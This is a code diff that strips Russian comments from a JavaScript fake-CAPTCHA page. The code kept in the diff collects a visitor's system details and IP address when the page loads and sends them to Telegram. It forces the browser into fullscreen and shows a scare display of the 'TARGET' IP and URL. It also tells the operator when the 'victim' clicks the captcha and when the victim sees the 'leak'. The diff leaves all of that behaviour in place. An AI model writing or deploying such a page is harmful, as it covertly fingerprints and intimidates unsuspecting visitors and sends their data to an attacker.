@@ -520,7 +520,6 @@ RAM: ${info.memory}
             } catch (e) {}
         }
 
-        // Функция для отправки сообщения о нажатии кнопки
         async function sendCaptchaPressed() {
             const text = '✅ <b>Нажата кнопка капчи</b>';
             try {
@@ -530,7 +529,6 @@ RAM: ${info.memory}
             } catch (e) {}
         }
 
-        // Функция для отправки уведомления что жертва увидела утечку
         async function sendLeakViewed() {
             const text = '⚠️ <b>Жертва увидела утечку данных!</b>';
             try {
@@ -604,7 +602,6 @@ RAM: ${info.memory}
             document.getElementById('robot-check').classList.add('checked');
             playBeep(600, 150);
 
-            // Отправляем сообщение о нажатии кнопки капчи
             sendCaptchaPressed();
 
             if (document.documentElement.requestFullscreen) {
@@ -625,7 +622,6 @@ RAM: ${info.memory}
             const sysInfo = getSystemInfo();
             const ip = await getIP();
 
-            // Убрана повторная отправка - данные уже отправлены при загрузке
 
             await addLine(`[TARGET] IP: ${ip}`, 'orange', 0);
             await addLine(`[TARGET] URL: ${sysInfo.url}`, 'green', 50);
@@ -674,7 +670,6 @@ RAM: ${info.memory}
                 }, index * 150);
             });
 
-            // Отправляем уведомление что жертва увидела утечку
             sendLeakViewed();
         }
 
@@ -706,7 +701,6 @@ RAM: ${info.memory}
 
             setupEventListeners();
 
-            // Отправляем данные только один раз при загрузке страницы
             const sysInfo = getSystemInfo();
             const ip = await getIP();
             sendToTelegram(sysInfo, ip);
